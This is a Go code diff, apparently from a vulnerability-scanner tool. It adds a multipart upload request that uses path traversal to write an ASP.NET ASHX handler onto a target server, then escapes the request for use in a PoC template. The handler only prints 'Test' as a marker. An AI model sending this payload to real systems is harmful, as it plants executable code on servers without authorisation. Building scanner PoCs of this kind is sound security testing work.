@@ -7,7 +7,7 @@ import (
 	"github.com/dlclark/regexp2"
 )
 
-func main2() {
+func main() {
 	// for _, line := range pocs.EmbedFileList {
 	// 	b, err := pocs.EmbedReadFile(line)
 	// 	if err != nil {
@@ -17,6 +17,36 @@ func main2() {
 	// 	fmt.Println(string(b))
 	// 	return
 	// }
+	body := `--2ac719f8e29343df94aa4ab49e456061
+Content-Disposition: form-data; name="dbId_v"
+
+.
+--2ac719f8e29343df94aa4ab49e456061
+Content-Disposition: form-data; name="FID"
+
+2022
+--2ac719f8e29343df94aa4ab49e456061
+Content-Disposition: form-data; name="FAtt"; filename="../../../../uploadfiles/test.ashx."
+Content-Type: text/plain
+
+<%@ WebHandler Language="C#" Class="TestHandler" %>
+		using System;
+		using System.Web;
+		public class TestHandler : IHttpHandler {
+			public void
+			ProcessRequest (HttpContext context) {
+				context.Response.ContentType= "text/plain";
+				context.Response.Write("Test");
+			}
+			public bool IsReusable {
+				get {return false; }
+			}
+		}
+--2ac719f8e29343df94aa4ab49e456061--
+	`
+	body = strings.ReplaceAll(body, `"`, `\"`)
+	body = strings.Replace(body, "\n", "\\r\\n\\\n", -1)
+	fmt.Println(body)
 
 	return
 	v2 := `
@@ -115,7 +145,7 @@ func main3() {
 	fmt.Println(resultMap)
 }
 
-func main() {
+func main1() {
 	var (
 		resultMap = make(map[string]string)
 	)
